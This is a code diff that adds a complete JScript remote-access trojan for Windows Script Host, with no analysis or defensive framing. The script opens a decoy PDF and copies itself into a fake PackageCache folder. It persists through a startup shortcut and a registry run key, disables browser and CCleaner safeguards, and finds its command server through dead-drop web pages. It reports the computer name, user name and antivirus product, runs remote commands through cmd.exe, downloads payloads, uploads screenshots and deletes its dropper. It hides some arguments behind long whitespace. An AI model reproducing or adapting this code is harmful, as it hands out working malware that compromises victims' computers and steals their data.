@@ -1,0 +1,406 @@
+var WshShell = new ActiveXObject("WScript.Shell"); //z1C06T
+var fso = new ActiveXObject("Scripting.FileSystemObject"); //z1C06T
+var shellApp = new ActiveXObject("shell.application"); //z1C06T
+ //z1C06T
+version = "1.2" //z1C06T
+ref = "boaelite" //z1C06T
+ //z1C06T
+items = ['https://www.codeplex.com/site/users/view/saidjaosdjo','https://raw.githubusercontent.com/iuasbduias/auhidshas/master/README.md']; //z1C06T
+StorageDir = WshShell.ExpandEnvironmentStrings("%localappdata%")+"\\Microsoft\\PackageCache\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}"; //z1C06T
+extracted_file = "DE42016128306MO.pdf"; //z1C06T
+extracted_file_filesize = 27416              ; //z1C06T
+lnk_filesize = 21047           ; //z1C06T
+startup_shortcut = StorageDir + "\\services.lnk"; //z1C06T
+agent_location = StorageDir + "\\file.js"; //z1C06T
+agent_hidden_executer = StorageDir + "\\startup.js"; //z1C06T
+g3r = StorageDir + "\\g3r.reg"; //z1C06T
+agent_id_location = StorageDir + "\\id"; //z1C06T
+lckFile = StorageDir+"\\h.lck"; //z1C06T
+ieFile = StorageDir + "\\kill.js"; //z1C06T
+phantomFile = StorageDir + "\\phantom.vbs"; 
+ //z1C06T
+pFolder = WshShell.ExpandEnvironmentStrings("%localappdata%")+"\\Python"; //z1C06T
+sctFile = pFolder+ "\\SC7.P7D"; //z1C06T
+pyFile = "main.py"; //z1C06T
+pyAlreadyRunning = 0; //z1C06T
+ //z1C06T
+main(); //z1C06T
+ //z1C06T
+function main() { //z1C06T
+	if(WScript.ScriptFullName != agent_location) { //z1C06T
+		extract_and_run_decoy(); //z1C06T
+		create_storage_dir(); //z1C06T
+		create_shortcut_in_startup(); //z1C06T
+		create_ie_file(); //z1C06T
+		create_startup_executer(); //z1C06T
+		copy_agent_to_new_location(); //z1C06T
+		exec_cscript(agent_location); //z1C06T
+		delete_temp_files(); //z1C06T
+	} else { //z1C06T
+		lck = fso.CreateTextFile(lckFile, 1); //z1C06T
+		exec_cscript(ieFile); 
+		exec_cscript(phantomFile); 
+		//z1C06T
+		main_loop(); //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function main_loop() { //z1C06T
+		var now = get_time(); //z1C06T
+		server = extract_srvaddr(); //z1C06T
+		try { //z1C06T
+			id = get_id(); //z1C06T
+			while(1) { //z1C06T
+				 //z1C06T
+				var passedsec = get_time()-now; //z1C06T
+				if(passedsec > 60*60){ //z1C06T
+					now = get_time(); //z1C06T
+					server = extract_srvaddr(); //z1C06T
+				} //z1C06T
+				 //z1C06T
+				command = get_page_content_with_ie(server + "/data.php", "action=getCommand&uid="+id); //z1C06T
+				eval("obj=" +command); //z1C06T
+				if(obj.command.length > 0) { //z1C06T
+					if(obj.command.search('download') >= 0) { //z1C06T
+						var spl = obj.command.split('|'); //z1C06T
+						file = get_page_content_with_ie(server + "/dwnld.php?u="+spl[1], ""); //z1C06T
+						if(file.length > 0) { //z1C06T
+							bin_write(spl[2], hex2bin(file)); //z1C06T
+						} //z1C06T
+					} else { //z1C06T
+						WshShell.Run("cmd.exe /c " +obj.command, 0, 0); //z1C06T
+					} //z1C06T
+					WScript.Sleep(10000); //z1C06T
+				} else { //z1C06T
+					WScript.Sleep(30000); //z1C06T
+				} //z1C06T
+				 //z1C06T
+				if(fso.FileExists(pFolder+"\\"+pyFile) && pyAlreadyRunning == 0) { //z1C06T
+					oldWd = WshShell.CurrentDirectory; //z1C06T
+					WshShell.CurrentDirectory = pFolder; //z1C06T
+					 //z1C06T
+					pyAlreadyRunning = 1; //z1C06T
+					WshShell.Run("python.exe                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     "+pyFile, 0, 0); //z1C06T
+						 //z1C06T
+					WshShell.CurrentDirectory = oldWd; //z1C06T
+				} //z1C06T
+				 //z1C06T
+				if(fso.FileExists(sctFile)) { //z1C06T
+					sctb64 = base64_encode(sctFile); //z1C06T
+					screen = get_page_content_with_ie(server + "/data.php", "action=sendScreenshot&uid="+id+"&data="+sctb64); //z1C06T
+					fso.DeleteFile(sctFile, 1); //z1C06T
+				} //z1C06T
+				 //z1C06T
+			} //z1C06T
+		} catch (e) { //z1C06T
+			WScript.Sleep(60000); //z1C06T
+			main_loop(); //z1C06T
+		} //z1C06T
+} //z1C06T
+ //z1C06T
+function get_id() { //z1C06T
+	id = ""; //z1C06T
+	while(id.length != 16) { //z1C06T
+		if(fso.FileExists(agent_id_location)) { //z1C06T
+			f = fso.OpenTextFile(agent_id_location, 1); //z1C06T
+			while (!f.AtEndOfStream) { //z1C06T
+				id += f.ReadLine(); //z1C06T
+			} //z1C06T
+			f.Close(); //z1C06T
+			up = get_page_content_with_ie(server + "/data.php", "action=up&uid="+id+"&antivirus="+return_av_name()); //z1C06T
+		} else { //z1C06T
+			id = get_page_content_with_ie(server + "/data.php", "action=getSerial&computer_name="+WshShell.ExpandEnvironmentStrings("%computername%")+"&username="+WshShell.ExpandEnvironmentStrings("%username%")+"&version="+version+"&ref="+ref); //z1C06T
+			if(id.length == 16) { //z1C06T
+				var s = fso.CreateTextFile(agent_id_location, true); //z1C06T
+				s.Write(id); //z1C06T
+				s.Close(); //z1C06T
+			} //z1C06T
+		} //z1C06T
+		WScript.Sleep(30000); //z1C06T
+	} //z1C06T
+	return id; //z1C06T
+} //z1C06T
+ //z1C06T
+function get_page_content_with_ie(url, postdata) { //z1C06T
+	try{ //z1C06T
+		r3g(); //z1C06T
+		WshShell.Run("reg import "+g3r, 0, 0); //z1C06T
+		var ie = new ActiveXObject("InternetExplorer.Application"); //z1C06T
+		ie.Visible = 0; //z1C06T
+		if(postdata.length == 0) { //z1C06T
+			ie.Navigate(url); //z1C06T
+		} else { //z1C06T
+			ie.Navigate(url, "", "", stream_string_to_binary(postdata), "Content-Type: application/x-www-form-urlencoded"); //z1C06T
+		} //z1C06T
+		i = 0; //z1C06T
+		while(i < 60) { //z1C06T
+			if(ie.ReadyState == 4) { //z1C06T
+				i = 60; //z1C06T
+			} //z1C06T
+			WScript.Sleep(1000); //z1C06T
+			i = i + 1; //z1C06T
+		} //z1C06T
+		content = ie.document.body.innerHTML; //z1C06T
+		content = content.replace("&amp;", "&"); //z1C06T
+		content = content.replace("&gt;", ">"); //z1C06T
+		content = content.replace("&lt;", "<"); //z1C06T
+		content = content.replace('&quot;', '"'); //z1C06T
+		content = content.replace("<pre>", ""); //z1C06T
+		content = content.replace("</pre>", ""); //z1C06T
+		content = content.replace("<PRE>", ""); //z1C06T
+		content = content.replace("</PRE>", ""); //z1C06T
+		ie.Quit(); //z1C06T
+		delete ie; //z1C06T
+		return content; //z1C06T
+	} catch (e) { //z1C06T
+			return ''; //z1C06T
+		} //z1C06T
+} //z1C06T
+ //z1C06T
+function stream_string_to_binary(str) { //z1C06T
+	var BinaryStream = WScript.CreateObject('ADODB.Stream'); //z1C06T
+	BinaryStream.Type = 2; //z1C06T
+	BinaryStream.CharSet = "us-ascii" //z1C06T
+	 //z1C06T
+	BinaryStream.Open(); //z1C06T
+	BinaryStream.WriteText(str); //z1C06T
+	BinaryStream.Position = 0; //z1C06T
+	BinaryStream.Type = 1; //z1C06T
+	 //z1C06T
+	return BinaryStream.read(); //z1C06T
+} //z1C06T
+ //z1C06T
+function num2dot(num) { //z1C06T
+	var d = num%256; //z1C06T
+	for (var i=3; i>0; i--) { //z1C06T
+		num = Math.floor(num/256); //z1C06T
+		d = num%256+'.'+d; //z1C06T
+	} //z1C06T
+	return d; //z1C06T
+} //z1C06T
+ //z1C06T
+function get_time() { //z1C06T
+	var date = new Date(); //z1C06T
+	return date.getTime()/1000|0; //z1C06T
+} //z1C06T
+ //z1C06T
+function extract_srvaddr() { //z1C06T
+	serverFound = false; //z1C06T
+	pattern = 'this is my first day in school (.*) cya next year'; //z1C06T
+	while(serverFound == false) { //z1C06T
+		var item = items[Math.floor(Math.random()*items.length)]; //z1C06T
+		var html = get_page_content_with_ie(item,''); //z1C06T
+		if(html != '') { //z1C06T
+			var match = extract_string(pattern, html); //z1C06T
+			if(match != null) { //z1C06T
+				srv = num2dot(match[1]/666); //z1C06T
+				srv = srv + "/126387267448467"; //z1C06T
+				srv_stat = get_page_content_with_ie(srv+'/s.php', ''); //z1C06T
+				validate_str = extract_string('youwillnotfindthisanywhare', srv_stat); //z1C06T
+				if(validate_str == 'youwillnotfindthisanywhare') { //z1C06T
+					serverFound = true; //z1C06T
+					return srv; //z1C06T
+				} //z1C06T
+			} //z1C06T
+		} //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function extract_string(pattern, str) { //z1C06T
+	if(pattern != '' && str != '') { //z1C06T
+		try { //z1C06T
+			re = new RegExp(pattern, 'i') //z1C06T
+			match = str.match(re); //z1C06T
+			return match; //z1C06T
+		} catch (e) { //z1C06T
+			return null; //z1C06T
+		} //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function r3g() { //z1C06T
+	var s = fso.CreateTextFile(g3r, true); //z1C06T
+	s.WriteLine('Windows Registry Editor Version 5.00'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows]'); //z1C06T
+	s.WriteLine('"run"="' +StorageDir.replace(/\\/g, "\\\\")+ '\\\\services.lnk"'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Control Panel\\Cursors]'); //z1C06T
+	s.WriteLine('"AppStarting"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5c,00,61,00,65,00,72,00,6f,00,5f,00,61,00,72,00,72,00,6f,00,77,00,2e,00,63,00,75,00,72,00,00,00'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]'); //z1C06T
+	s.WriteLine('"Check_Associations"="no"'); //z1C06T
+	s.WriteLine('"NoProtectedModeBanner"=dword:00000001'); //z1C06T
+	s.WriteLine('"IE10RunOncePerInstallCompleted"=dword:00000001'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery]'); //z1C06T
+	s.WriteLine('"AutoRecover"=dword:00000002'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\PhishingFilter]'); //z1C06T
+	s.WriteLine('"EnabledV9"=dword:00000001'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation]'); //z1C06T
+	s.WriteLine('"MSCompatibilityMode"=dword:00000001'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]'); //z1C06T
+	s.WriteLine('"EnableBalloonTips"=dword:00000000'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Internet Settings]'); //z1C06T
+	s.WriteLine('"GlobalUserOffline"=dword:00000000'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3]'); //z1C06T
+	s.WriteLine('"2500"=dword:00000003'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.WriteLine('[HKEY_CURRENT_USER\\Software\\Piriform\\CCleaner]'); //z1C06T
+	s.WriteLine('"BrowserMonitoring"=-'); //z1C06T
+	s.WriteLine('"(Mon)3001"=-'); //z1C06T
+	s.WriteLine(''); //z1C06T
+	s.Close(); //z1C06T
+} //z1C06T
+ //z1C06T
+function return_av_name() { //z1C06T
+	try { //z1C06T
+		var oWMISrvc = GetObject("winmgmts:\\\\.\\root\\cimv2"); //z1C06T
+		var colOperatingSystems = oWMISrvc.ExecQuery("SELECT * FROM Win32_OperatingSystem"); //z1C06T
+		 //z1C06T
+		var objItem = new Enumerator(colOperatingSystems);	 //z1C06T
+		for(;!objItem.atEnd();objItem.moveNext()) { //z1C06T
+			var version = objItem.item().Version.substr(0,3); //z1C06T
+		} //z1C06T
+		 //z1C06T
+		try { //z1C06T
+			var oWMI = GetObject("winmgmts:\\\\.\\root\\SecurityCenter"); //z1C06T
+		} catch(e) { //z1C06T
+			try { //z1C06T
+				var oWMI = GetObject("winmgmts:\\\\.\\root\\SecurityCenter2"); //z1C06T
+			} catch (e) { //z1C06T
+				return 'N/A'; //z1C06T
+			} //z1C06T
+		} //z1C06T
+		 //z1C06T
+		var colItems = oWMI.ExecQuery("SELECT displayName FROM AntiVirusProduct", "WQL"); //z1C06T
+		 //z1C06T
+		var enumItems = new Enumerator(colItems); //z1C06T
+		for (;!enumItems.atEnd();enumItems.moveNext()) { //z1C06T
+			var name = enumItems.item().displayName; //z1C06T
+		} //z1C06T
+		 //z1C06T
+		if(name != null && name != '') { //z1C06T
+			return name; //z1C06T
+		} else { //z1C06T
+			return 'Unknown'; //z1C06T
+		} //z1C06T
+	} catch (e) { //z1C06T
+		return 'N/A'; //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function CreateFolderRecursive(FullPath) { //z1C06T
+	var arr = [], dir = [], path = [] //z1C06T
+	 //z1C06T
+	arr = FullPath.split("\\"); //z1C06T
+	path = ""; //z1C06T
+	for(index=0; index<arr.length; ++index) { //z1C06T
+		if(path != "") //z1C06T
+			path = path+"\\"; //z1C06T
+		path = path+""+arr[index]; //z1C06T
+		if(!fso.FolderExists(path)) { //z1C06T
+			try { //z1C06T
+				fso.CreateFolder(path); //z1C06T
+			} catch (e) { //z1C06T
+			} //z1C06T
+		} //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function copy_agent_to_new_location() { //z1C06T
+	fso.CopyFile(WScript.ScriptFullName, agent_location); //z1C06T
+} //z1C06T
+ //z1C06T
+function create_startup_executer() { //z1C06T
+	var s = fso.CreateTextFile(agent_hidden_executer, true); //z1C06T
+	s.WriteLine('var WshShell = new ActiveXObject("WScript.Shell");'); //z1C06T
+	s.WriteLine('WshShell.Run("C:\\\\Windows\\\\System32\\\\cscript.exe                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    '+agent_location.replace(/\\/g, "\\\\")+'", 0, 0);'); //z1C06T
+	s.Close(); //z1C06T
+} //z1C06T
+ //z1C06T
+function create_shortcut_in_startup() { //z1C06T
+	var oShellLink = WshShell.CreateShortcut(startup_shortcut);  //z1C06T
+	oShellLink.TargetPath = "%comspec%";  //z1C06T
+	oShellLink.Arguments = "/c cscript "+agent_hidden_executer;  //z1C06T
+	oShellLink.WindowStyle = 7;  //z1C06T
+	oShellLink.WorkingDirectory = StorageDir;  //z1C06T
+	oShellLink.Save(); //z1C06T
+} //z1C06T
+ //z1C06T
+ //z1C06T
+function create_storage_dir() { //z1C06T
+	if(!fso.FolderExists(StorageDir)) { //z1C06T
+		CreateFolderRecursive(StorageDir); //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function create_ie_file() { //z1C06T
+	if(!fso.FileExists(ieFile)) { //z1C06T
+		var s = fso.CreateTextFile(ieFile, true); //z1C06T
+		s.WriteLine(unescape("var%20oWMISrvc%20%3D%20GetObject%28%22winmgmts%3A%5C%5C%5C%5C.%5C%5Croot%5C%5Ccimv2%22%29%3Bwhile%281%29%7BWScript.Sleep%28180000%29%3B%20cProcNIE%28%29%3B%7Dfunction%20cProcNIE%28%29%20%7Btry%20%7Bvar%20colProcLst%20%3D%20oWMISrvc.ExecQuery%28%22SELECT%20*%20FROM%20Win32_Process%20WHERE%20CommandLine%20LIKE%20%27%25-Embedding%25%27%20AND%20Name%20%3D%20%27iexplore.exe%27%22%29%3Bvar%20objItem%20%3D%20new%20Enumerator%28colProcLst%29%3Bfor%28%3B%21objItem.atEnd%28%29%3BobjItem.moveNext%28%29%29%20%7Bvar%20p%20%3D%20objItem.item%28%29%3Bp.Terminate%28%29%3B%7D%7D%20catch%20%28e%29%20%7B%7D%7D")); //z1C06T
+		s.Close(); //z1C06T
+	} //z1C06T
+} //z1C06T
+ //z1C06T
+function extract_file(src, dest, start, file_size) { //z1C06T
+	var oFile = fso.GetFile(src); //z1C06T
+	var oRead = oFile.OpenAsTextStream(); //z1C06T
+	data = oRead.Read(oFile.Size); //z1C06T
+	oRead.Close(); //z1C06T
+	offset_data = data.substr(start+1, file_size); //z1C06T
+	var wFile = fso.OpenTextFile(dest, 2, true); //z1C06T
+	wFile.Write(offset_data); //z1C06T
+	wFile.Close(); //z1C06T
+} //z1C06T
+ //z1C06T
+function delete_temp_files() { //z1C06T
+	fso.DeleteFile(WScript.arguments(0), 1); //z1C06T
+	fso.DeleteFile(WScript.ScriptFullName, 1); //z1C06T
+} //z1C06T
+ //z1C06T
+function extract_and_run_decoy() { //z1C06T
+	extract_file(WScript.arguments(0), extracted_file, lnk_filesize, extracted_file_filesize); //z1C06T
+	WshShell.Run("cmd.exe /c "+extracted_file, false, false); //z1C06T
+} //z1C06T
+ //z1C06T
+function exec_cscript(path) { //z1C06T
+	WshShell.Run("cscript.exe                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     "+path, false, false); //z1C06T
+} //z1C06T
+ //z1C06T
+function base64_encode(path) { //z1C06T
+	var inputStream = new ActiveXObject('ADODB.Stream'); //z1C06T
+	inputStream.Open(); //z1C06T
+	inputStream.Type = 1; //z1C06T
+	inputStream.LoadFromFile(path); //z1C06T
+	var bytes = inputStream.Read(); //z1C06T
+	var dom = new ActiveXObject('Microsoft.XMLDOM'); //z1C06T
+	var elem = dom.createElement('tmp'); //z1C06T
+	elem.dataType = 'bin.base64'; //z1C06T
+	elem.nodeTypedValue = bytes; //z1C06T
+	return elem.text.replace(/[^A-Z\d+=\/]/gi, ''); //z1C06T
+} //z1C06T
+ //z1C06T
+function bin_write(path, bin_data) { //z1C06T
+	var BinaryStream = WScript.CreateObject("ADODB.Stream"); //z1C06T
+	BinaryStream.Type = 2; //z1C06T
+	BinaryStream.Charset = "ISO-8859-1"; //z1C06T
+	BinaryStream.Open(); //z1C06T
+	BinaryStream.WriteText(bin_data); //z1C06T
+	BinaryStream.SaveToFile(path, 2); //z1C06T
+	BinaryStream.Close(); //z1C06T
+} //z1C06T
+ //z1C06T
+function hex2bin(hex) { //z1C06T
+	var bytes = [], str; //z1C06T
+ //z1C06T
+	for(var i=0; i< hex.length-1; i+=2) //z1C06T
+		bytes.push(parseInt(hex.substr(i, 2), 16)); //z1C06T
+ //z1C06T
+	return String.fromCharCode.apply(String, bytes);	 //z1C06T
+} //z1C06T
